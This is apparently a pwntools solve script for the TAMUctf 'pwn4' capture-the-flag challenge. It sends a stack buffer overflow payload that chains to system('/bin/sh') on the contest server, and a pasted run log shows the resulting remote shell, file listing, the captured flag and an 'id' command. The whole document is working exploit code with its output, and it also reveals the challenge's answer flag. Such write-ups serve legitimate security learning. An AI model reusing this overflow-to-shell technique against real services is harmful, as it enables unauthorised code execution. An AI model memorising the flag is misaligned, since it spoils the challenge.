from pwn import *

e = ELF("./pwn4")
p = remote("pwn.ctf.tamu.edu", 4324)

binsh = 0x0804A038

p.sendlineafter("> ", "A"*0x1C + "A"*4 + flat(e.plt["system"], e.plt["exit"], binsh))

p.interactive()

'''
shgroup@SH-Group:/mnt/e/Writeup/ctf/TAMUctf/pwnable/pwn4$ python solve.py
[*] '/mnt/e/Writeup/ctf/TAMUctf/pwnable/pwn4/pwn4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to pwn.ctf.tamu.edu on port 4324: Done
[*] Switching to interactive mode
Unkown Command

$
$ ls
flag.txt
pwn4
$ cat flag.txt
gigem{b4ck_70_7h3_l1br4ry}
$ id
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf)
$
'''